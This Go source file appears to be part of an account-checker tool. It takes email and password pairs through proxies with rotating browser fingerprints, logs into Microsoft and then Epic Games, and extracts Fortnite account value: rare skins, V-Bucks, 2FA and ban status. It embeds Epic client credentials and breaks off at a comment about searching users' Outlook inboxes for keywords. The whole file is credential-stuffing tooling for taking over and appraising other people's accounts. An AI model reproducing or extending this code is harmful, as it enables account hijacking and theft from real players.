// Package epic implements the Epic Games / Fortnite account check (login via
// Xbox/Microsoft SISU, locker stats, V-Bucks, specials catalog).
package epic

import (
	"encoding/json"
	"fmt"
	http "github.com/bogdanfinn/fhttp"
	"io"
	"net/url"
	"strings"
	"time"

	"xbox-checker/internal/nettls"
)

const (
	EpicXBLLoginURL  = "https://www.epicgames.com/id/api/external/xbl/login"
	EpicRedirectURL  = "https://www.epicgames.com/id/api/redirect?"
	EpicLauncherAuth = "basic MzRhMDJjZjhmNDQxNGUyOWIxNTkyMTg3NmRhMzZmOWE6ZGFhZmJjY2M3Mzc3NDUwMzlkZmZlNTNkOTRmYzc2Y2Y="
	EpicFortniteAuth = "basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ="
)

func Retryable(info string) bool {
	return strings.Contains(info, "Check failed") ||
		strings.Contains(info, "CSRF") ||
		strings.Contains(info, "Bad code")
}

// CheckAccount logs into Epic via Xbox/Microsoft (config flow) and
// pulls Fortnite locker stats. Always returns a "Fortnite: ..." field.
func CheckAccount(email, password, proxyStr string) string {
	preset := nettls.NextPreset()
	client, noRedir := nettls.NewPairProfile(proxyStr, 30*time.Second, 25*time.Second, preset.Profile)
	if client == nil || noRedir == nil {
		return "Fortnite: Check failed"
	}
	jar := client.GetCookieJar()
	ua := preset.UA

	// 1) Xbox/Microsoft login then grab the SISU auth code Epic XBL login expects
	req, err := http.NewRequest("GET", nettls.MSAuthPreflightURL, nil)
	if err != nil {
		return "Fortnite: Check failed"
	}
	req.Header.Set("User-Agent", ua)
	resp, err := nettls.Do(client, req)
	if err != nil {
		return "Fortnite: Check failed"
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	ppft := nettls.ExtractPPFT(string(body))
	if ppft == "" {
		return "Fortnite: Check failed"
	}

	form := url.Values{}
	form.Set("i13", "0")
	form.Set("login", email)
	form.Set("loginfmt", email)
	form.Set("type", "11")
	form.Set("LoginOptions", "3")
	form.Set("passwd", password)
	form.Set("ps", "2")
	form.Set("PPFT", ppft)
	form.Set("NewUser", "1")
	form.Set("IsFidoSupported", "1")
	form.Set("i19", "36463")
	req2, _ := http.NewRequest("POST", nettls.MSLoginPostURL, strings.NewReader(form.Encode()))
	req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req2.Header.Set("Origin", "https://login.live.com")
	req2.Header.Set("User-Agent", ua)
	resp2, err := nettls.Do(client, req2)
	if err != nil {
		return "Fortnite: Check failed"
	}
	io.Copy(io.Discard, resp2.Body)
	resp2.Body.Close()

	// Epic XBL login rejects the SISU XboxLive code. It wants a code from
	// Epic's Microsoft Xbox app (client 82023151-c27d-4fb5-8551-10c10724a55e).
	epicXblAuth := "https://login.live.com/oauth20_authorize.srf?" + url.Values{
		"client_id":      {"82023151-c27d-4fb5-8551-10c10724a55e"},
		"redirect_uri":   {"https://accounts.epicgames.com/OAuthAuthorized"},
		"scope":          {"xboxlive.signin"},
		"response_type":  {"code"},
		"display":        {"popup"},
		"force_verify":   {"true"},
		"service_entity": {"undefined"},
		"prompt":         {"none"},
	}.Encode()
	req3, _ := http.NewRequest("GET", epicXblAuth, nil)
	req3.Header.Set("User-Agent", ua)
	resp3, err := nettls.Do(noRedir, req3)
	if err != nil {
		return "Fortnite: Check failed"
	}
	b3, _ := io.ReadAll(resp3.Body)
	resp3.Body.Close()
	loc := resp3.Header.Get("Location")
	code := nettls.ExtractParam(loc+"\n"+string(b3), "code=")
	if decoded, err := url.QueryUnescape(code); err == nil && decoded != "" {
		code = decoded
	}
	if code == "" {
		low := strings.ToLower(loc)
		if strings.Contains(low, "consent_required") ||
			strings.Contains(low, "login_required") ||
			strings.Contains(low, "interaction_required") ||
			strings.Contains(low, "access_denied") {
			return "Fortnite: No Account"
		}
		return "Fortnite: No Account"
	}

	// 2) Epic CSRF (token cookie is Path=/id)
	reqC, _ := http.NewRequest("GET", "https://www.epicgames.com/id/api/csrf", nil)
	reqC.Header.Set("User-Agent", ua)
	reqC.Header.Set("Accept", "application/json, text/plain, */*")
	if respC, err := nettls.Do(client, reqC); err == nil {
		io.Copy(io.Discard, respC.Body)
		respC.Body.Close()
	}
	xsrf := nettls.CookieValue(jar, "https://www.epicgames.com/id/api/csrf", "XSRF-TOKEN")
	if xsrf == "" {
		xsrf = nettls.CookieValue(jar, "https://www.epicgames.com/id/login", "XSRF-TOKEN")
	}

	// 3) Login to Epic with the Microsoft/Xbox code
	xblBody := fmt.Sprintf(`{"code":%q}`, code)
	reqX, _ := http.NewRequest("POST", EpicXBLLoginURL, strings.NewReader(xblBody))
	reqX.Header.Set("Content-Type", "application/json;charset=UTF-8")
	reqX.Header.Set("Accept", "application/json, text/plain, */*")
	reqX.Header.Set("User-Agent", ua)
	reqX.Header.Set("X-Requested-With", "XMLHttpRequest")
	reqX.Header.Set("Origin", "https://www.epicgames.com")
	reqX.Header.Set("Referer", "https://www.epicgames.com/id/login/xbl")
	if xsrf != "" {
		reqX.Header.Set("X-XSRF-TOKEN", xsrf)
		reqX.Header.Set("X-Xsrf-Token", xsrf)
	}
	respX, err := nettls.Do(client, reqX)
	if err != nil {
		return "Fortnite: Check failed"
	}
	bx, _ := io.ReadAll(respX.Body)
	respX.Body.Close()
	sx := string(bx)
	if strings.Contains(sx, "Two-Factor") || strings.Contains(sx, "twoFactor") || strings.Contains(sx, "two_factor_authentication") {
		return "Fortnite: 2FA"
	}
	if strings.Contains(sx, "No account was found") || strings.Contains(sx, "DATE_OF_BIRTH") ||
		strings.Contains(sx, "link_account_not_allowed") {
		return "Fortnite: No Account"
	}
	if ec := nettls.ExtractJSONString(sx, "errorCode"); ec != "" {
		switch {
		case strings.Contains(ec, "csrf"):
			return "Fortnite: CSRF"
		case strings.Contains(ec, "invalid_grant"):
			return "Fortnite: Bad code"
		default:
			return "Fortnite: No Account"
		}
	}

	// 4) Get exchange code from Epic session
	reqEx, _ := http.NewRequest("GET", EpicRedirectURL, nil)
	reqEx.Header.Set("Accept", "application/json, text/plain, */*")
	reqEx.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) EpicGamesLauncher/16.7.0-34134031+++Portal+Release-Live UnrealEngine/4.27.0-34134031+++Portal+Release-Live Chrome/90.0.4430.212 Safari/537.36")
	reqEx.Header.Set("X-Requested-With", "XMLHttpRequest")
	if xsrf != "" {
		reqEx.Header.Set("X-XSRF-TOKEN", xsrf)
	}
	respEx, err := nettls.Do(client, reqEx)
	if err != nil {
		return "Fortnite: No Account"
	}
	bex, _ := io.ReadAll(respEx.Body)
	respEx.Body.Close()
	ex := nettls.ExtractJSONString(string(bex), "exchangeCode")
	if ex == "" {
		ex = nettls.ExtractParam(string(bex), "\"exchangeCode\":\"")
		ex = strings.Trim(ex, `"`)
	}
	if ex == "" {
		return "Fortnite: No Account"
	}

	// 5) Exchange -> launcher token
	tokForm := url.Values{}
	tokForm.Set("grant_type", "exchange_code")
	tokForm.Set("exchange_code", ex)
	tokForm.Set("token_type", "eg1")
	reqT, _ := http.NewRequest("POST", "https://account-public-service-prod.ak.epicgames.com/account/api/oauth/token", strings.NewReader(tokForm.Encode()))
	reqT.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	reqT.Header.Set("Authorization", EpicLauncherAuth)
	reqT.Header.Set("User-Agent", "UELauncher/16.7.0-34134031+++Portal+Release-Live Windows/10.0.19045.1.256.64bit")
	respT, err := nettls.Do(client, reqT)
	if err != nil {
		return "Fortnite: Check failed"
	}
	bt, _ := io.ReadAll(respT.Body)
	respT.Body.Close()
	at1 := nettls.ExtractJSONString(string(bt), "access_token")
	accID := nettls.ExtractJSONString(string(bt), "account_id")
	if at1 == "" {
		return "Fortnite: No Account"
	}

	// 6) Launcher token -> Fortnite client token
	reqE2, _ := http.NewRequest("GET", "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange", nil)
	reqE2.Header.Set("Authorization", "bearer "+at1)
	reqE2.Header.Set("User-Agent", ua)
	respE2, err := nettls.Do(client, reqE2)
	if err != nil {
		return "Fortnite: Check failed"
	}
	be2, _ := io.ReadAll(respE2.Body)
	respE2.Body.Close()
	code22 := nettls.ExtractJSONString(string(be2), "code")
	if code22 == "" {
		return "Fortnite: Check failed"
	}

	fnForm := url.Values{}
	fnForm.Set("grant_type", "exchange_code")
	fnForm.Set("exchange_code", code22)
	reqFN, _ := http.NewRequest("POST", "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", strings.NewReader(fnForm.Encode()))
	reqFN.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	reqFN.Header.Set("Authorization", EpicFortniteAuth)
	respFN, err := nettls.Do(client, reqFN)
	if err != nil {
		return "Fortnite: Check failed"
	}
	bfn, _ := io.ReadAll(respFN.Body)
	respFN.Body.Close()
	at := nettls.ExtractJSONString(string(bfn), "access_token")
	if accID == "" {
		accID = nettls.ExtractJSONString(string(bfn), "account_id")
	}
	if at == "" {
		at = at1
	}

	displayName := nettls.ExtractJSONString(string(bt), "displayName")
	if accID != "" {
		reqAcc, _ := http.NewRequest("GET", "https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/"+accID, nil)
		reqAcc.Header.Set("Authorization", "bearer "+at1)
		reqAcc.Header.Set("User-Agent", "UELauncher/11.0.2-14967703+++Portal+Release-Live Windows/10.0.19041.1.256.64bit")
		if respAcc, err := nettls.Do(client, reqAcc); err == nil {
			ba, _ := io.ReadAll(respAcc.Body)
			respAcc.Body.Close()
			if displayName == "" {
				displayName = nettls.ExtractJSONString(string(ba), "displayName")
			}
		}
	}

	// 7) STW check
	hasSTW := "NO"
	if accID != "" {
		stwURL := "https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/" + accID + "/public/QueryPublicProfile?profileId=campaign"
		reqSTW, _ := http.NewRequest("POST", stwURL, strings.NewReader("{}"))
		reqSTW.Header.Set("Content-Type", "application/json")
		reqSTW.Header.Set("Authorization", "Bearer "+at)
		if respSTW, err := nettls.Do(client, reqSTW); err == nil {
			bstw, _ := io.ReadAll(respSTW.Body)
			respSTW.Body.Close()
			if strings.Contains(string(bstw), "tutorial") {
				hasSTW = "YES"
			}
		}
	}

	// 8) Athena locker
	skins, wins, level, banned := 0, 0, 0, false
	specials := ""
	if accID != "" {
		athURL := "https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/" + accID + "/client/QueryProfile?profileId=athena&rvn=-1"
		reqAth, _ := http.NewRequest("POST", athURL, strings.NewReader("{}"))
		reqAth.Header.Set("Content-Type", "application/json")
		reqAth.Header.Set("Authorization", "bearer "+at)
		reqAth.Header.Set("User-Agent", "Fortnite/++Fortnite+Release-8.51-CL-6165369 Windows/10.0.17763.1.256.64bit")
		if respAth, err := nettls.Do(client, reqAth); err == nil {
			bath, _ := io.ReadAll(respAth.Body)
			respAth.Body.Close()
			src := string(bath)
			if strings.Contains(src, "PLAY") && (strings.Contains(src, "1023") || strings.Contains(src, "banned") || respAth.StatusCode == 403) {
				banned = true
			}
			skins = strings.Count(src, `AthenaCharacter:`)
			if n, ok := nettls.JSONIntFrom(src, "lifetime_wins"); ok {
				wins = n
			}
			if n, ok := nettls.JSONIntFrom(src, "accountLevel"); ok {
				level = n
			}
			specials = detectSpecials(src)
		}
	}

	// 9) common_core — V-Bucks (Shared + MtxPurchased + MtxPurchaseBonus)
	vbucks := 0
	if accID != "" {
		ccURL := "https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/" + accID + "/client/QueryProfile?profileId=common_core&rvn=-1"
		reqCC, _ := http.NewRequest("POST", ccURL, strings.NewReader("{}"))
		reqCC.Header.Set("Content-Type", "application/json")
		reqCC.Header.Set("Authorization", "bearer "+at)
		reqCC.Header.Set("User-Agent", "Fortnite/++Fortnite+Release-8.51-CL-6165369 Windows/10.0.17763.1.256.64bit")
		if respCC, err := nettls.Do(client, reqCC); err == nil {
			bcc, _ := io.ReadAll(respCC.Body)
			respCC.Body.Close()
			vbucks = parseVbucks(string(bcc))
		}
	}

	if banned {
		return "Fortnite: Account Banned"
	}

	parts := []string{}
	if displayName != "" {
		parts = append(parts, "Display: "+displayName)
	}
	parts = append(parts, fmt.Sprintf("Skins: %d", skins))
	parts = append(parts, fmt.Sprintf("Wins: %d", wins))
	parts = append(parts, fmt.Sprintf("Account Level: %d", level))
	parts = append(parts, "STW: "+hasSTW)
	parts = append(parts, fmt.Sprintf("VBucks: %d", vbucks))
	if specials != "" {
		parts = append(parts, "Specials: "+specials)
	}
	return "Fortnite: [" + strings.Join(parts, " | ") + "]"
}

type specialVariant struct {
	Channel string
	Stage   string
}

type specialDef struct {
	Name     string
	ID       string
	Variants []specialVariant // empty = ID only
}

func specialCatalog() []specialDef {
	return []specialDef{
		// OG skins — require the listed variant stage
		{Name: "OG Renegade", ID: "AthenaCharacter:cid_028_athena_commando_f", Variants: []specialVariant{{"Material", "Mat3"}}},
		{Name: "OG Aerial", ID: "AthenaCharacter:cid_017_athena_commando_m", Variants: []specialVariant{{"Parts", "Stage2"}}},
		{Name: "OG Skull", ID: "AthenaCharacter:cid_030_athena_commando_m_halloween", Variants: []specialVariant{{"ClothingColor", "Mat3"}}},
		{Name: "OG Ghoul", ID: "AthenaCharacter:cid_029_athena_commando_f_halloween", Variants: []specialVariant{{"Material", "Mat3"}}},
		{Name: "Max Omega", ID: "AthenaCharacter:cid_116_athena_commando_m_carbideblack", Variants: []specialVariant{{"Progressive", "Stage5"}}},
		{Name: "OG Travis", ID: "AthenaCharacter:cid_703_athena_commando_m_cyclone", Variants: []specialVariant{{"Parts", "Stage2"}}},
		{Name: "OG Ghost Portal", ID: "AthenaBackpack:bid_104_halloweenm", Variants: []specialVariant{{"ClothingColor", "Stage3"}}},
		{Name: "Gold Peely Pack", ID: "AthenaBackpack:bid_463_bananaagent", Variants: []specialVariant{{"Progressive", "Stage4"}}},
		{Name: "OG Mini Marauder", ID: "AthenaBackpack:bid_154_gingerbreadmale", Variants: []specialVariant{{"Material", "Stage2"}}},
		{Name: "OG Giddy-Gun", ID: "AthenaBackpack:bid_155_gingerbreadfemale", Variants: []specialVariant{{"Material", "Stage2"}}},

		// Flat promotional skins
		{Name: "Black Knight", ID: "AthenaCharacter:cid_035_athena_commando_m_medieval"},
		{Name: "Galaxy", ID: "AthenaCharacter:cid_175_athena_commando_m_celestial"},
		{Name: "IKONIK", ID: "AthenaCharacter:cid_313_athena_commando_m_kpopfashion"},
		{Name: "Honor Guard", ID: "AthenaCharacter:cid_342_athena_commando_m_streetracermetallic"},
		{Name: "Wonder", ID: "AthenaCharacter:cid_434_athena_commando_f_stealthhonor"},
		{Name: "Double Helix", ID: "AthenaCharacter:cid_183_athena_commando_m_modernmilitaryred"},
		{Name: "Stealth Reflex", ID: "AthenaCharacter:cid_386_athena_commando_m_streetopsstealth"},
		{Name: "Eon", ID: "AthenaCharacter:cid_174_athena_commando_f_carbidewhite"},
		{Name: "Wildcat", ID: "AthenaCharacter:cid_757_athena_commando_f_wildcat"},
		{Name: "Marshmello", ID: "AthenaCharacter:cid_333_athena_commando_m_squishy"},
		{Name: "Major Lazer", ID: "AthenaCharacter:cid_474_athena_commando_m_lasagna"},
		{Name: "Psycho Bandit", ID: "AthenaCharacter:cid_515_athena_commando_m_barbequelarry"},
		{Name: "Demogorgon", ID: "AthenaCharacter:cid_466_athena_commando_m_weirdobjectscreature"},
		{Name: "Travis Scott", ID: "AthenaCharacter:cid_703_athena_commando_m_cyclone"},
		{Name: "Astro Jack", ID: "AthenaCharacter:cid_761_athena_commando_m_cyclonespace"},

		// Pickaxes
		{Name: "Raider's Revenge", ID: "AthenaPickaxe:pickaxe_lockjaw"},
		{Name: "Axe of Champions", ID: "AthenaPickaxe:pickaxe_id_376_fncs"},
		{Name: "Axe of Champions 2.0", ID: "AthenaPickaxe:pickaxe_id_804_fncss20male"},
		{Name: "Merry Mint Axe", ID: "AthenaPickaxe:pickaxe_id_294_candycane"},
		{Name: "Resonator", ID: "AthenaPickaxe:pickaxe_id_077_carbidewhite"},
		{Name: "Stellar Axe", ID: "AthenaPickaxe:pickaxe_id_116_celestial"},
		{Name: "Angler Pickaxe", ID: "AthenaPickaxe:pickaxe_id_156_streetracerblue"},
		{Name: "Rhizonyx", ID: "AthenaPickaxe:pickaxe_id_109_archetypered"},
		{Name: "Pivot Axe", ID: "AthenaPickaxe:pickaxe_id_147_reflexred"},
		{Name: "Diamond Jack", ID: "AthenaPickaxe:pickaxe_id_365_cyclone"},
		{Name: "Lazer Axe", ID: "AthenaPickaxe:pickaxe_id_258_musicgroup"},
		{Name: "Psycho Buzz Axes", ID: "AthenaPickaxe:pickaxe_id_250_borderlands"},

		// Gliders
		{Name: "Aerial Assault One", ID: "AthenaGlider:glider_id_001"},
		{Name: "Discovery", ID: "AthenaGlider:glider_id_090_galaxy"},
		{Name: "Aurora", ID: "AthenaGlider:glider_id_088_criterionred"},
		{Name: "Teleporter", ID: "AthenaGlider:glider_id_109_archetypered"},
		{Name: "Pivot Glider", ID: "AthenaGlider:glider_id_147_reflexred"},
		{Name: "Snowflake", ID: "AthenaGlider:umbrella_season2"},
		{Name: "Astroworld Cyclone", ID: "AthenaGlider:glider_id_203_cyclone"},

		// Emotes
		{Name: "Floss", ID: "AthenaDance:eid_floss"},
		{Name: "The Worm", ID: "AthenaDance:eid_worm"},
		{Name: "Pony Up", ID: "AthenaDance:eid_ridetheponytwo"},
		{Name: "Scenario", ID: "AthenaDance:eid_kpopdance03"},
		{Name: "Levitate", ID: "AthenaDance:eid_davinci"},
		{Name: "Bhangra Boogie", ID: "AthenaDance:eid_bollywood"},
		{Name: "Click!", ID: "AthenaDance:eid_heelclick"},
		{Name: "Headbanger", ID: "AthenaDance:eid_headbang"},

		// Back blings
		{Name: "Black Shield", ID: "AthenaBackpack:bid_004_blackknight"},
		{Name: "Royale Shield", ID: "AthenaBackpack:bid_002_royaleknight"},
		{Name: "Squire Shield", ID: "AthenaBackpack:bid_001_bluesquire"},
		{Name: "Red Shield", ID: "AthenaBackpack:bid_003_redknight"},
		{Name: "Rust Bucket", ID: "AthenaBackpack:bid_027_scavenger"},
		{Name: "Cactus Jack", ID: "AthenaBackpack:bid_468_cyclone"},
		{Name: "Penguin", ID: "AthenaBackpack:bid_071_tencentpenguin"},
		{Name: "Insignia", ID: "AthenaBackpack:bid_072_tencentshield"},
		{Name: "Galactic Disc", ID: "AthenaBackpack:bid_102_galaxy"},
		{Name: "Telemetry", ID: "AthenaBackpack:bid_124_archetypered"},
		{Name: "Destabilizer", ID: "AthenaBackpack:bid_099_criterionred"},
		{Name: "Response Unit", ID: "AthenaBackpack:bid_168_reflexred"},
		{Name: "Cactus Jack", ID: "AthenaBackpack:bid_497_cyclone"},
		{Name: "Astroworld", ID: "AthenaBackpack:bid_498_astroworld"},
		{Name: "Deflector", ID: "AthenaBackpack:bid_053_commando"},
		{Name: "Kyo", ID: "AthenaBackpack:bid_291_cyberpunkblue"},
		{Name: "Phrenzy", ID: "AthenaBackpack:bid_612_skaterparkour"},
		{Name: "Blue Shift", ID: "AthenaBackpack:bid_039_tacticalblue"},
		{Name: "Carbon Pack", ID: "AthenaBackpack:bid_219_streetops"},
		{Name: "Mello Pod", ID: "AthenaBackpack:bid_198_marshmello"},
		{Name: "Lazer Wings", ID: "AthenaBackpack:bid_328_musicgroup"},
		{Name: "Psycho Claptrap", ID: "AthenaBackpack:bid_312_borderlands"},
		{Name: "RLG FNCS 2021", ID: "AthenaBackpack:bid_700_fncs"},
		{Name: "Precision", ID: "AthenaBackpack:bid_016_military"},
		{Name: "Backup Plan", ID: "AthenaBackpack:bid_018_commando"},
	}
}

func itemHasVariant(attrs map[string]interface{}, channel, stage string) bool {
	if channel == "" || stage == "" {
		return true
	}
	raw, ok := attrs["variants"]
	if !ok {
		return false
	}
	list, ok := raw.([]interface{})
	if !ok {
		return false
	}
	wantCh := strings.ToLower(channel)
	wantSt := strings.ToLower(stage)
	altSt := wantSt
	if strings.HasPrefix(wantSt, "stage") {
		altSt = "mat" + strings.TrimPrefix(wantSt, "stage")
	} else if strings.HasPrefix(wantSt, "mat") {
		altSt = "stage" + strings.TrimPrefix(wantSt, "mat")
	}
	matchTag := func(tag string) bool {
		t := strings.ToLower(tag)
		return strings.Contains(t, wantSt) || strings.Contains(t, altSt)
	}
	for _, v := range list {
		obj, ok := v.(map[string]interface{})
		if !ok {
			continue
		}
		ch, _ := obj["channel"].(string)
		if strings.ToLower(ch) != wantCh {
			continue
		}
		active, _ := obj["active"].(string)
		if matchTag(active) {
			return true
		}
		if owned, ok := obj["owned"].([]interface{}); ok {
			for _, o := range owned {
				if s, ok := o.(string); ok && matchTag(s) {
					return true
				}
			}
		}
	}
	return false
}

func collectAthenaItems(src string) map[string]map[string]interface{} {
	out := map[string]map[string]interface{}{}
	var root interface{}
	if json.Unmarshal([]byte(src), &root) != nil {
		return out
	}
	var walk func(v interface{})
	walk = func(v interface{}) {
		switch t := v.(type) {
		case map[string]interface{}:
			if tid, ok := t["templateId"].(string); ok && tid != "" {
				attrs, _ := t["attributes"].(map[string]interface{})
				if attrs == nil {
					attrs = map[string]interface{}{}
				}
				out[strings.ToLower(tid)] = attrs
			}
			for _, child := range t {
				walk(child)
			}
		case []interface{}:
			for _, child := range t {
				walk(child)
			}
		}
	}
	walk(root)
	return out
}

func specialKind(id string) string {
	low := strings.ToLower(id)
	switch {
	case strings.HasPrefix(low, "athenacharacter:"):
		return "Skins"
	case strings.HasPrefix(low, "athenabackpack:"):
		return "Backblings"
	case strings.HasPrefix(low, "athenapickaxe:"):
		return "Pickaxes"
	case strings.HasPrefix(low, "athenaglider:"):
		return "Gliders"
	case strings.HasPrefix(low, "athenadance:"):
		return "Emotes"
	default:
		return "Other"
	}
}

func detectSpecials(athenaJSON string) string {
	items := collectAthenaItems(athenaJSON)
	grouped := map[string][]string{}
	seen := map[string]bool{}
	order := []string{"Skins", "Backblings", "Pickaxes", "Gliders", "Emotes", "Other"}
	for _, def := range specialCatalog() {
		attrs, ok := items[strings.ToLower(def.ID)]
		if !ok {
			continue
		}
		okVar := true
		for _, need := range def.Variants {
			if !itemHasVariant(attrs, need.Channel, need.Stage) {
				okVar = false
				break
			}
		}
		if !okVar {
			continue
		}
		key := def.Name
		if seen[key] {
			continue
		}
		seen[key] = true
		kind := specialKind(def.ID)
		grouped[kind] = append(grouped[kind], def.Name)
	}
	var parts []string
	for _, kind := range order {
		names := grouped[kind]
		if len(names) == 0 {
			continue
		}
		parts = append(parts, fmt.Sprintf("[%s: %s]", kind, strings.Join(names, ", ")))
	}
	return strings.Join(parts, " ")
}

func itemQuantity(obj map[string]interface{}) int {
	switch q := obj["quantity"].(type) {
	case float64:
		return int(q)
	case json.Number:
		n, _ := q.Int64()
		return int(n)
	}
	return 0
}

func parseVbucks(src string) int {
	// Ledger rows have no platform / platform "None" (every pack ever received).
	// Current balance is Currency:Mtx* with a real platform: Shared, Live, IOSAppStore, etc.
	total := 0
	var walk func(v interface{})
	walk = func(v interface{}) {
		switch t := v.(type) {
		case map[string]interface{}:
			tid, _ := t["templateId"].(string)
			if strings.HasPrefix(strings.ToLower(tid), "currency:mtx") {
				plat := ""
				if attrs, ok := t["attributes"].(map[string]interface{}); ok {
					plat, _ = attrs["platform"].(string)
				}
				if plat != "" && !strings.EqualFold(plat, "None") {
					total += itemQuantity(t)
				}
			}
			for _, child := range t {
				walk(child)
			}
		case []interface{}:
			for _, child := range t {
				walk(child)
			}
		}
	}
	var root interface{}
	if json.Unmarshal([]byte(src), &root) == nil {
		walk(root)
	}
	return total
}

// searchInboxForKeywords performs a dedicated Outlook-client login (required for
